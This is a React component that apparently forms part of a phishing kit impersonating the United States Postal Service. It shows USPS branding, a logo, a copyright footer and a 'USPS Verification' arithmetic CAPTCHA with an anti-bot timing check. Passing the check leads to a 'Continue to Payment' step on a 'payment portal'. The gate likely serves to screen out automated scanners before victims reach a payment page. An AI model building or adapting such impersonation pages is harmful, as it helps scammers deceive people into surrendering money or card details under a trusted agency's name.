import React, { useState, useEffect } from 'react';


const CaptchaGate = ({ onVerified }) => {
  const [captcha, setCaptcha] = useState({ question: '', answer: '' });
  const [userAnswer, setUserAnswer] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [timeOnPage, setTimeOnPage] = useState(0);

  const generateCaptcha = () => {
    const operations = ['+', '-', '*'];
    const operation = operations[Math.floor(Math.random() * operations.length)];
    let num1, num2, answer;

    switch(operation) {
      case '+':
        num1 = Math.floor(Math.random() * 10) + 1;
        num2 = Math.floor(Math.random() * 10) + 1;
        answer = num1 + num2;
        break;
      case '-':
        num1 = Math.floor(Math.random() * 10) + 6;
        num2 = Math.floor(Math.random() * 5) + 1;
        answer = num1 - num2;
        break;
      case '*':
        num1 = Math.floor(Math.random() * 5) + 1;
        num2 = Math.floor(Math.random() * 5) + 1;
        answer = num1 * num2;
        break;
    }

    setCaptcha({
      question: `${num1} ${operation} ${num2}`,
      answer: answer.toString()
    });
    setUserAnswer('');
    setError('');
  };

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeOnPage(prev => prev + 1);
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    generateCaptcha();
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    
    // Anti-bot: Minimum time requirement
    if (timeOnPage < 3) {
      setError('Please wait a moment before submitting');
      setLoading(false);
      return;
    }

    setTimeout(() => {
      if (userAnswer.trim() === captcha.answer) {
        sessionStorage.setItem('captchaVerified', 'true');
        onVerified();
      } else {
        setError('Incorrect answer. Please try again.');
        generateCaptcha();
      }
      setLoading(false);
    }, 500);
  };

  return (
    <div className="captcha-gate-container">
      <header className="usps-header">
        <img src="/usps-logo.png" alt="USPS Logo" className="usps-logo" />
        <h1>USPS Verification</h1>
      </header>
      
      <main className="captcha-gate-main">
        <form onSubmit={handleSubmit} className="captcha-form">
          <h2>Human Verification Required</h2>
          <p>Please solve this CAPTCHA to continue to the payment portal</p>
          
          <div className="captcha-display">
            <span className="captcha-question">{captcha.question} = ?</span>
            <input
              type="text"
              value={userAnswer}
              onChange={(e) => setUserAnswer(e.target.value)}
              required
              placeholder="Answer"
              disabled={loading}
              className="captcha-input"
            />
          </div>
          
          {error && <div className="captcha-error">{error}</div>}
          
          <div className="captcha-footer">
            <button 
              type="submit" 
              disabled={loading} 
              className="captcha-submit"
            >
              {loading ? (
                <>
                  <span className="captcha-spinner"></span> Verifying...
                </>
              ) : 'Continue to Payment'}
            </button>
          </div>
        </form>
      </main>
      
      <footer className="captcha-footer">
        <p>Â© {new Date().getFullYear()} United States Postal Service. All rights reserved.</p>
      </footer>
    </div>
  );
};

export default CaptchaGate;
